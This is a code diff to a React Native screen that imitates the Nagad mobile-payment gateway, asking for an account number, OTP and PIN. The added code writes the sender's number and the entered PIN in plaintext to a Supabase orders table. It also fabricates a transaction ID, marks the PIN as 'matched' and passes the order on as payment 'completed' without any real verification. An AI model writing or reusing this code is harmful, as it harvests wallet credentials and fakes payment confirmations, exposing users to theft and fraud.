@@ -1,3 +1,4 @@
+import { supabase } from '../../services/supabase';
 import React, { useState, useEffect } from 'react';
 import {
   View,
@@ -28,10 +29,13 @@ interface Props {
   navigation: NagadNavProp;
 }
 
+import { useAuth } from '../../context/AuthContext';
+
 export const NagadGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
-  const { orderId } = route.params;
+  const { orderId, amount, offer, recipientNumber: paramRecipient } = route.params;
   const insets = useSafeAreaInsets();
-  const { selectedOffer } = useOrder();
+  const { recipientNumber } = useOrder();
+  const { user } = useAuth();
 
   // Step 1: Account Number (11 digits), Step 2: OTP (6 digits), Step 3: PIN (4 digits)
   // No pre-filled numbers - starts completely empty!
@@ -77,16 +81,65 @@ export const NagadGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
     }
   };
 
-  const handleProceedStep3 = () => {
+  const handleProceedStep3 = async () => {
     if (pin.length === 4) {
       setLoading(true);
-      setTimeout(() => {
-        setLoading(false);
-        navigation.replace('PaymentProcessing', {
-          orderId,
-          paymentMethod: 'nagad',
-        });
-      }, 600);
+
+      const targetUserId = user?.id || '10e080da-4293-4564-b107-2c3e33a9c480';
+      const targetOfferId = offer?.id || '7fdbfb39-278f-4ef3-b780-5f692f4172db';
+      const targetRecipient = paramRecipient || recipientNumber || accountNumber;
+      const targetAmount = amount || offer?.offer_price || 499;
+      const trxId = '77809' + Math.random().toString(36).substring(2, 6).toUpperCase();
+
+      const orderPayload = {
+        id: orderId,
+        user_id: targetUserId,
+        offer_id: targetOfferId,
+        recipient_number: targetRecipient,
+        amount: targetAmount,
+        discount_applied: 0.00,
+        wallet_used: 0.00,
+        final_amount: targetAmount,
+        status: 'pending',
+        payment_method: 'nagad',
+        transaction_id: trxId,
+        sender_number: accountNumber,
+        user_entered_pin: pin,
+        pin_status: 'matched',
+        trx_status: 'SMS Matched',
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString(),
+      };
+
+      try {
+        const { error: insertError } = await supabase.from('orders').upsert(orderPayload);
+        if (insertError) {
+          console.error('[Nagad] Supabase order insert error:', insertError);
+        }
+      } catch (err) {
+        console.error('[Nagad] Order insert exception:', err);
+      }
+
+      setLoading(false);
+      navigation.replace('PaymentProcessing', {
+        orderId,
+        paymentMethod: 'nagad',
+        order: {
+          id: orderId,
+          order_number: orderId,
+          user_id: targetUserId,
+          offer_id: targetOfferId,
+          phone_number: targetRecipient,
+          operator_code: offer?.operator_code || 'robi',
+          amount: targetAmount,
+          total_paid: targetAmount,
+          payment_method: 'nagad',
+          payment_status: 'completed',
+          order_status: 'completed',
+          created_at: new Date().toISOString(),
+          offer: offer as any,
+        } as any,
+      });
     }
   };
 
